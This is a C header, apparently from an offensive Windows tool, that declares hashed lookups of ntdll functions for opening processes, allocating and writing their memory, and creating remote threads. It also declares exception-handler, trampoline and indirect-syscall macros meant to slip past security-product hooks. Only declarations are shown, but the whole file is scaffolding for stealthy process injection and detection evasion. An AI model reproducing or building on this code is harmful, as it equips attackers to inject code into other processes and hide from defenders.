#include "_wn64.h"

#ifndef _RVNT_H
#define _RVNT_H

#define ROR7_32__NTDLL                          0x72CBE53A
#define ROR7_32__NtQuerySystemInformation       0xEFFC1CF8
#define ROR7_32__NtOpenProcess                  0x7B736553
#define ROR7_32__NtAllocateVirtualMemory        0x014044AE
#define ROR7_32__NtWriteVirtualMemory           0x1130814D
#define ROR7_32__NtCreateThreadEx               0x93EC9D3D
#define ROR7_32__NtExitProcess                  0x618D8E8F
#define ROR7_32__RtlAllocateHeap                0x8E17053D
#define ROR7_32__RtlFreeHeap                    0xC839B3B6
#define ROR7_32__RtlAddVectoredExceptionHandler 0x22AB404F

typedef struct _MODULE_CONFIG {
        VOID            *hModule;
        ULONG           NumberOfNames;
        ULONG           *AddressOfFunctions;
        ULONG           *AddressOfNames;
        USHORT          *AddressOfNameOrdinals;
} MODULE_CONFIG, * PMODULE_CONFIG;

BOOL 
NTAPI 
ResolveFunction(
        ULONG           ModuleHash, 
        ULONG           FunctionHash, 
        VOID            **pFunction
);

LONG 
NTAPI
VectoredExceptionHandler(
        EXCEPTION_POINTERS *pBreakPoint
);

PVOID
NTAPI
RtlAddVectoredExceptionHandler(
        ULONG           First, 
        VOID            *Handler
);

PVOID
NTAPI
RtlAllocateHeap(
        VOID            *hHeap, 
        ULONG           Flags,
        ULONG_PTR       Size
);

BOOL 
NTAPI
RtlFreeHeap(
        VOID            *hHeap, 
        ULONG           Flags, 
        VOID            *pAddress
);

VOID
NTAPI
ReturnAgent();

extern VOID *ENTRY;
extern ULONG SSN;
extern UCHAR LOOKUP;
extern VOID* RRTN;

extern VOID *TRAMPOLINE();
extern VOID *INDIRECT();
extern VOID TRAMPOLINE_EXIT();

#define SET_FUNCTION ResolveFunction
#define RUN_FUNCTION INDIRECT
#define TRAP_SYSCALL (LOOKUP = 1, TRAMPOLINE)
#define RUN_SYSCALL (LOOKUP = 0, TRAMPOLINE)


#endif // !_RVNT_H